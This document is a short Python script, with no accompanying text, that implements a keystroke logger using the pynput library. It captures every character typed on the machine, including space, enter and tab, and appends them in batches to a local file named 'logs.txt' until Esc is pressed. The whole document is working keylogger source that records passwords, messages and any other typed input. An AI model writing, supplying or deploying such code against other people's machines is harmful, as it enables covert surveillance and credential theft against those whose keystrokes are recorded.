from pynput.keyboard import Key, Listener
log_buffer = []
CHARACTER_LIMIT = 10 
def write_to_file(buffer_data):
    with open('logs.txt', 'a') as f:
        f.write("".join(buffer_data))

def on_press(key):
    global log_buffer
    if hasattr(key, 'char') and key.char is not None:
        log_buffer.append(key.char)
    else:
        if key == Key.space:
            log_buffer.append(' ')
        elif key == Key.enter:
            log_buffer.append('\n')
        elif key == Key.tab:
            log_buffer.append('\t')
        
    if len(log_buffer) >= CHARACTER_LIMIT:
        write_to_file(log_buffer)
        log_buffer.clear()
def on_release(key):
    if key == Key.esc:
        if log_buffer:
            write_to_file(log_buffer)
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
